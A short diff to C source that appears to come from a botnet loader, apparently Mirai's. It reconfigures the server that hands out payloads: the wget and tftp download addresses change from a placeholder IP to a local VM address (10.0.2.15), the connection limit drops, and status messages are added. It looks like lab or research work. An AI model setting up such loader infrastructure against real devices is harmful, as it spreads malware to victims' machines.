@@ -49,12 +49,14 @@ int main(int argc, char **args)
         return 1;
     }
 
-    /*                                                                                   wget address           tftp address */
-    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
+    printf("Initializing server.\n");
+    /*                                                                     max_cons  wget address           tftp address */
+    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024, "10.0.2.15", 80, "10.0.2.15")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
     }
+    printf("Finished initializing server.\n");
 
     pthread_create(&stats_thrd, NULL, stats_thread, NULL);
 
